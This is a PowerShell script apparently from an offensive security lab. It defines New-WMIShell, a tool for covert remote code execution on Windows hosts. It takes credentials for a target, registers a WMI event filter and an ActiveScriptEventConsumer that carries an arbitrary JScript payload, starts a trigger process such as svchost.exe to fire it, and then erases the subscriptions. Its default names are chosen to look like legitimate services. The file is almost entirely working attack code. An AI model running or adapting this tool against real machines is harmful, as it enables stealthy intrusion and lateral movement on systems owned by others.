function New-WMIShell {
    <#
    .SYNOPSIS 

    Author: lengyi(@honghu-lab)

    #>
    [CmdletBinding(DefaultParameterSetName = 'None')]
    param 
    (
        [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$Target,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Domain,

        [Parameter(Mandatory = $false, ParameterSetName = "Credentials")]
        [ValidateNotNullOrEmpty()]
        [string]$Username,

        [Parameter(Mandatory = $false, ParameterSetName = "Credentials")]
        [ValidateNotNullOrEmpty()]
        [string]$Password,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ConsumerName = 'WSUSA',

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$FilterName = 'WSUSA',

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({Test-Path -Path $_})]
        [string]$JScriptPath,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ProcessName = 'svchost.exe', 

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Payload        
    )
    $wmiArgs = @{}
    $commonArgs = @{}

    if ($Domain) {
        $Username = $Domain + "\" + $Username
    }
  

    if ($PSCmdlet.ParameterSetName -eq "Credentials" -and $PSBoundParameters['Target']) {
        $securePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
        $commonArgs['Credential'] = New-Object System.Management.Automation.PSCredential $Username,$securePassword
    }

    if($PSBoundParameters['Target']) {
        $commonArgs['ComputerName'] = $Target
    }

    if ($PSBoundParameters['JScriptPath']) {
        $Payload = [System.IO.File]::ReadAllText($JScriptPath)
    }

    echo "[+] WMIshell Author: lengyi(@honghu-lab)"

    $Query = "SELECT * FROM Win32_ProcessStartTrace where processname ='$ProcessName'"
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $FilterName
        Query = $Query
        QueryLanguage = 'WQL'
    }

    echo "[*] Creating the WMI filter"
    $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @commonArgs

    $ActiveScriptEventConsumerArgs = @{
        Name = $ConsumerName
        ScriptingEngine = 'JScript'
        ScriptText = $Payload
    }
    Start-Sleep -Seconds 5
    echo "[*] Creating the WMI consumer"
    $Consumer =  Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments $ActiveScriptEventConsumerArgs @commonArgs

    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    Start-Sleep -Seconds 5
    echo "[*] Creating the WMI filter to consumer binding"
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs @commonArgs

    echo "[+] Executing process trigger"
    Start-Sleep -Seconds 3
    $result = Invoke-WmiMethod -Class Win32_process -Name Create -ArgumentList "$ProcessName" @commonArgs
    if ($result.returnValue -ne 0) {
        echo "[-] Trigger process was not started"
        break
    }

    Start-Sleep -Seconds 5
    $EventConsumerToCleanup = Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -Filter "Name = '$ConsumerName'" @commonArgs
    $EventFilterToCleanup = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name = '$FilterName'" @commonArgs
    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root\subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" @commonArgs
    
    $EventConsumerToCleanup | Remove-WmiObject
    $EventFilterToCleanup | Remove-WmiObject
    $FilterConsumerBindingToCleanup | Remove-WmiObject

    $OutputObject = New-Object -TypeName PSObject 
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'Target' -Value $Target
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'FilterName' -Value $FilterName
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'ConsumerName' -Value $ConsumerName
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'ProcessTrigger' -Value $ProcessName
    $OutputObject | Add-Member -MemberType 'NoteProperty' -Name 'Query' -Value $Query

    $OutputObject

    echo "[+] Cleaning up the subscriptions"

}
